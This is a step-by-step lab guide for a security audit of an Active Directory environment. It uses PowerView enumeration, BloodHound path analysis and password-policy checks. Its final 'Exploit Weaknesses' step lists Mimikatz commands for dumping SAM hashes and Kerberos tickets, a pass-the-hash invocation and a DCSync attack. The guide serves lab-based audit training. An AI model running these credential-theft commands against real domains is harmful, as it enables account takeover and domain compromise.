Vulnerability Analysis of Active Directory

Vulnerability Analysis of Active Directory [project: conduct a security audit of active directory (AD) environment to discover weaknesses like insecure configurations, weak password policies, or privilege escalation opportunities; Tools and Software- BloodHound(for analysing AD permissions and finding privilege escalation paths), PowerView(for Power shell- based AD enumeration and exploitation), Mimikatz(for extracting password hashes and Kerberos tickets)]

Uses:
The focus is on identifying weaknesses such as insecure configurations, weak password policies, and privilege escalation opportunities using tools like BloodHound, PowerView, and Mimikatz.


Step 1: Set Up the Lab Environment
Create the AD Environment:
Use VirtualBox or VMware to create a lab setup.

Install and configure:
A Windows Server as the Domain Controller (DC). One or more client systems joined to the domain (e.g., Windows 10).

Install Tools:
•	BloodHound: Download from GitHub.
•	PowerView: Part of the PowerShell Empire toolkit, or download from GitHub.
•	Mimikatz: Download from GitHub.

Enable Required Features:
On the Domain Controller, ensure Active Directory Services and Group Policy Management are set up. Set weak policies (e.g., password policy, permissions) for testing.


Step 2: Enumerate the Active Directory
Using PowerView, Load PowerView in PowerShell:
Download PowerView.ps1 and import it in PowerShell:  
powershell
Import-Module .\PowerView.ps1

Enumerate Domain Information: Gather basic domain information:
powershell
Get-NetDomain

List Domain Controllers: Identify Domain Controllers in the AD environment:
powershell
Get-NetDomainController

Find Active Sessions: Enumerate user sessions on specific machines:
powershell
Get-NetSession -ComputerName <computer_name>

Search for Shares: Identify shared folders in the domain:
powershell
Invoke-ShareFinder


Step 3: Analyze Privileges and Relationships
Using BloodHound Collect AD Data: Use the SharpHound ingestor to collect data:
powershell
.\SharpHound.exe -c All
This generates .zip files containing AD information.

Upload Data to BloodHound: Start the Neo4j database and BloodHound GUI:
bash
neo4j console
bloodhound

Log in to BloodHound and upload the .zip files.


Analyze Privilege Escalation Paths:
Use pre-built queries like:
•	Shortest Path to Domain Admins.
•	Users with Kerberoastable SPNs.
•	Look for insecure configurations, overly permissive groups, and attack paths.



Step 4: Identify Weak Configurations
Check Password Policies:
On the Domain Controller, review password policies using Group Policy Management:
powershell
Get-ADDefaultDomainPasswordPolicy

Search for Misconfigurations:
Use PowerView to find weak permissions:
powershell
Invoke-ACLScanner

Detect Kerberoastable Accounts:
Find accounts with Service Principal Names (SPNs):
powershell
Get-NetUser -SPN


Step 5: Exploit Weaknesses
•	Using Mimikatz, Extract Password Hashes

•	Launch Mimikatz with administrative privileges:
bash
mimikatz.exe

•	Dump NTLM hashes from the SAM database:
privilege::debug
lsadump::sam

•	Extract Kerberos Tickets: Dump Kerberos tickets:
sekurlsa::tickets

•	Pass the Hash:

•	Use captured NTLM hashes to authenticate without knowing the password:
sekurlsa::pth /user:<username> /domain:<domain_name> /ntlm:<hash>

•	Using PowerView, Perform a DCSync attack to extract password hashes:
powershell
Invoke-DCSync -DomainController <DC_name> -Credential <admin_credential>



